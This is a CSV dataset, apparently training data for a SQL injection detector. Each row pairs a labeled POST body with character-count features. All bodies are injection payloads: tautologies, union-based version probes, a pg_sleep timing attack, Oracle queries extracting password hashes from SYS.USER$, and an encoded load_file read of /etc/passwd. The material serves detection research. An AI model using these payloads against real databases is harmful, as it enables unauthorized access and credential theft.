method,body,class,single_q,double_q,dashes,braces,spaces,badwords,path
POST,""" or pg_sleep  (  __TIME__  )  --",1,0,1,3,2,10,1,
POST,create user name identified by pass123 temporary tablespace temp default tablespace users,1,0,0,0,0,11,2,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,3,0,3,2,30,6,
POST," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1,0,1,3,3,29,6,
POST, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,1,0,3,2,31,6,
POST,select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1,0,0,0,6,26,0,
POST," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1,3,0,3,2,29,6,
POST," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1,3,0,3,0,17,6,
POST,? or 1  =  1 --,1,0,0,3,0,7,1,
POST, )   or   (  'a'  =  'a,1,3,0,0,2,13,1,
POST,admin' or 1  =  1#,1,1,0,0,0,6,1,
POST," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,or 1  =  1 --,1,0,0,3,0,6,1,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,3,0,3,2,24,5,
POST," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,distinct,1,0,0,0,0,0,1,
POST,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,3,0,3,2,26,4,
POST,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,2,0,0,8,53,4,
POST,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST,"admin"" or ""1""  =  ""1""--",1,0,5,3,0,6,1,
POST," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,insert,1,0,0,0,0,0,1,
POST," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,0,1,3,0,24,5,
POST," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,"or 1  =  1 or """"  =  ",1,0,2,0,0,11,2,
POST,/**/or/**/1/**/  =  /**/1,1,0,0,0,0,4,0,
POST," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
